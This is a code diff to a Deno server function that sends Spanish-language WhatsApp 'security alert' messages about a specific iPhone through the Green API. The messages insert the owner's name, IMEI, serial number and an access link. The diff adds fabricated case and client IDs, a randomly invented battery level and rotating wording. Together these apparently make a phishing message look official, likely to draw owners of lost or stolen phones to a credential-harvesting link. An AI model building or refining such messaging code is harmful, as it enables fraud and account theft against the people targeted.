@@ -186,9 +186,10 @@ Deno.serve(async (req) => {
         const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
         const caseId = `CAS-${dateStr}-${Math.floor(1000 + Math.random() * 9000)}`;
         const clientId = `CL-${Math.floor(100000000000 + Math.random() * 900000000000)}`;
+        const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
         
         // Replace variables in template with actual process data
-        const customSection = template.template_content
+        let customSection = template.template_content
           .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
           .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
           .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
@@ -196,12 +197,15 @@ Deno.serve(async (req) => {
           .replace(/\{color\}/g, queuedMessage.processes?.color || '')
           .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
           .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
-          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '')
-          .replace(/\{url\}/g, queuedMessage.processes?.url || '');
+          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '');
 
-        // Build complete message with random variations (like normal messages)
+        // Add URL if available
+        if (queuedMessage.processes?.url) {
+          customSection += `\n\n🔗 Acceso al sistema: ${queuedMessage.processes.url}`;
+        }
+
+        // Build complete message with random variations
         const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
-        const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
         
         const openings = [
           "🛡️ Alerta de seguridad del sistema",
@@ -226,7 +230,13 @@ Deno.serve(async (req) => {
 • Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}
 • Código IMEI: ${queuedMessage.processes?.imei}
 • No. Serie: ${queuedMessage.processes?.serial_number}
-• Batería actual: ${battery} %`
+• Batería actual: ${battery} %`,
+
+          `• Equipo: ${queuedMessage.processes?.iphone_model}
+• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}
+• Identificador IMEI: ${queuedMessage.processes?.imei}
+• Número de serie: ${queuedMessage.processes?.serial_number}
+• Carga restante: ${battery} %`
         ];
         
         const helpPhrases = [
@@ -241,7 +251,7 @@ Deno.serve(async (req) => {
           "Monitoreo continuo – Asistencia permanente"
         ];
 
-        // Build complete message: opening + custom section + device + help + closing
+        // Build complete message: opening + custom section + IDs + device + help + closing
         queuedMessage.message_content = `${random(openings)}
 
 ${customSection}
@@ -357,13 +367,15 @@ ${random(closings)}`;
     let greetingResult;
     
     if (apiProvider === 'greenapi') {
+      // Remove any + or spaces from phone number for Green API
+      const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
       greetingResponse = await fetch(`${apiUrl}/sendMessage/${token}`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          chatId: `${queuedMessage.recipient_phone}@c.us`,
+          chatId: `${cleanPhone}@c.us`,
           message: greetingMessage,
         }),
       });
@@ -414,13 +426,14 @@ ${random(closings)}`;
       console.log('Sending full message with image');
       
       if (apiProvider === 'greenapi') {
+        const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
         const response = await fetch(`${apiUrl}/sendFileByUrl/${token}`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chatId: `${queuedMessage.recipient_phone}@c.us`,
+            chatId: `${cleanPhone}@c.us`,
             urlFile: queuedMessage.image_url,
             fileName: 'device-image.jpg',
             caption: queuedMessage.message_content,
@@ -446,13 +459,14 @@ ${random(closings)}`;
       console.log('Sending full text message');
       
       if (apiProvider === 'greenapi') {
+        const cleanPhone = queuedMessage.recipient_phone.replace(/[\s+]/g, '');
         const response = await fetch(`${apiUrl}/sendMessage/${token}`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
-            chatId: `${queuedMessage.recipient_phone}@c.us`,
+            chatId: `${cleanPhone}@c.us`,
             message: queuedMessage.message_content,
           }),
         });
